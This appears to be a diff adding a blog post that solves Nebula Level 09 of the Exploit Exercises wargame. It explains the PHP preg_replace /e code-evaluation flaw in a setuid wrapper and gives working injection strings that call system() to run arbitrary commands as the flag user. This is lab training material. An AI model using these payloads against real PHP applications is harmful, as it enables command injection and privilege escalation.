@@ -1,0 +1,320 @@
+
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<title>Exploit Exercises - Nebula Level 09 - Han</title>
+	<meta name="author" content="Zealoct">
+
+	
+	<meta name="description" content="Exploit Exercises - Nebula Level 09 2014年01月24日 Exercises, Nebula, Security About There&rsquo;s a C setuid wrapper for some vulnerable PHP code& &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Han" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://zealoct.github.io/blog/2014/01/24/nebula-level09/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<link href='http://fonts.googleapis.com/css?family=Nunito:400,300,700' rel='stylesheet' type='text/css'>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	
+  
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-48829613-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	
+	<img src="/images/profile.jpg" alt="Profile Picture" style="width: 160px;" />
+	<!--<img src="http://www.gravatar.com/avatar/?s=160" alt="Profile Picture" style="width: 160px;" />-->
+	
+</div>
+
+<nav id="main-nav"><ul class="main">
+    <li><a href="/">Blog</a></li>
+    <li><a href="http://about.me/hanjc">About</a></li>
+    <li><a href="/blog/archives">Archives</a></li>
+</ul>
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		
+		
+			<a class="twitter" href="http://twitter.com/zealoct" title="Twitter">Twitter</a>
+		
+		
+			<a class="github" href="https://github.com/zealoct" title="GitHub">GitHub</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+			<a class="rss" href="/atom.xml" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+<div id="banner" class="inner">
+	<div class="container">
+		<ul class="feed"></ul>
+	</div>
+	<small><a href="http://twitter.com/zealoct">zealoct</a> @ <a href="http://twitter.com">Twitter</a></small>
+	<div class="loading">Loading...</div>
+</div>
+<script src="/javascripts/twitter.js"></script>
+<script type="text/javascript">
+	(function($){
+		$('#banner').getTwitterFeed('zealoct', 5, );
+	})(jQuery);
+</script>
+
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Exploit Exercises - Nebula Level 09</h1>
+	<div class="meta">
+		<span class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-24T11:43:40+08:00" data-updated="true" itemprop="datePublished">2014年01月24日</time></span>
+		<span class="tags">
+
+
+	<a class='category' href='/blog/categories/exercises/'>Exercises</a>, <a class='category' href='/blog/categories/nebula/'>Nebula</a>, <a class='category' href='/blog/categories/security/'>Security</a>
+
+
+</span>
+	</div>
+	<div class="entry-content" itemprop="articleBody"><h3>About</h3>
+
+<p>There&rsquo;s a C setuid wrapper for some vulnerable PHP code&hellip;</p>
+
+<p>To do this level, log in as the <em>level09</em> account with the password <em>level09</em>. Files for this level can be found in /home/flag09.</p>
+
+<h3>Source code</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> <span class="nf">spam</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\./&quot;</span><span class="p">,</span> <span class="s2">&quot; dot &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$email</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/@/&quot;</span><span class="p">,</span> <span class="s2">&quot; AT &quot;</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="nv">$email</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> <span class="nf">markup</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$use_me</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/(\[email (.*)\])/e&quot;</span><span class="p">,</span> <span class="s2">&quot;spam(</span><span class="se">\&quot;\\</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\[/&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/\]/&quot;</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<h3>Solution</h3>
+
+<p>This php snippet does the following things:</p>
+
+<ul>
+<li>read the content of file $argv[1]</li>
+<li>replace all the text paterns liket &ldquo;[email <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#104;&#x6a;&#x63;&#64;&#x68;&#97;&#x6e;&#106;&#x63;&#46;&#x6d;&#x65;">&#104;&#x6a;&#x63;&#x40;&#x68;&#97;&#110;&#106;&#x63;&#x2e;&#x6d;&#x65;</a>]&rdquo; with &ldquo;hjc AT hanjc dot me&rdquo;</li>
+<li>replace all the &ldquo;[&rdquo; with &ldquo;&lt;&rdquo;, replace &ldquo;]&rdquo; with &ldquo;>&rdquo;</li>
+</ul>
+
+
+<p>At the very first glace, there seems to be no problem about this code (well, turns out to be that anyone who is familiar with php security would recognize immediatly the vulnerability). But what I knew was that if there be something wrong, it must be the php function <code>preg_replace</code>.</p>
+
+<p>Google this function and I found many useful thing. There is a <a href="https://bugs.php.net/bug.php?id=35960">bug report</a> related to this function, and another <a href="http://www.madirish.net/402">article</a> explains in detail about how to exploit this vulnerability.</p>
+
+<p>In general, the vulnerability exists when a &ldquo;\e&rdquo; is set in the PCRE expression provided to the <code>preg_replace</code> function (as in the code above), in this case, php will do normal substitution of backreferences in the replacement string, evaluate it as PHP code, and use the result for replacing the search string, as mentioned <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">here</a>. This link also provides an input string tha could exploit this function, which is</p>
+
+<pre><code>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;
+</code></pre>
+
+<p>As my goal is to run system command with this function, I modified this attack string to be</p>
+
+<pre><code>[email {${system('touch /home/flag09/test')}}]
+</code></pre>
+
+<p>Save this string in /tmp/txt, and run the following command</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/home/flag09/flag09 /tmp/txt noused
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Although the program produced some errors, the file /home/flag09/test indeed appeared! So this should be a doable way to execute any command, but it is not convenient. Notice there is an additional argument <code>$use_me</code> to function <code>markup</code> that is never used in the function, the name of this variable indicates its purpose, which is too obvious to ignore. So I modified /tmp/txt to</p>
+
+<pre><code>[email {${system($use_me)}}]
+</code></pre>
+
+<p>Now I could run any command with</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/home/flag09/flag09 /tmp/txt <span class="s2">&quot;any command&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	
+	<a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+</div>
+
+
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_renren"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_reddit"></a>
+	<a class="jiathis_button_twitter"></a>
+	<a class="jiathis_button_fb"></a>
+	<a class="jiathis_button_googleplus"></a>
+	<a class="jiathis_button_gmail"></a>
+	<a class="jiathis_button_douban"></a>
+	<a class="jiathis_button_tumblr"></a>
+	<a class="jiathis_button_yixin"></a>
+	<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+	var jiathis_config={
+summary:"",
+		shortUrl:false,
+		hideMore:false
+	}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!--  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script> -->
+</div>
+
+	
+	</br>
+    <p class="meta">
+      
+        <a class="basic-alignment left nextprev" href="/blog/2014/01/24/nebula-level08/" title="Previous Post: Exploit Exercises - Nebula Level 08">&laquo; Exploit Exercises - Nebula Level 08</a>
+      
+      
+        <a class="basic-alignment right nextprev" href="/blog/2014/01/25/nebula-level10/" title="Next Post: Exploit Exercises - Nebula Level 10">Exploit Exercises - Nebula Level 10 &raquo;</a>
+      
+    </p>
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+</div>
+			</div>
+			<footer id="footer" class="inner">Copyright &copy; 2014
+
+    Zealoct
+
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+		</div>
+	</div>
+</body>
+</html>
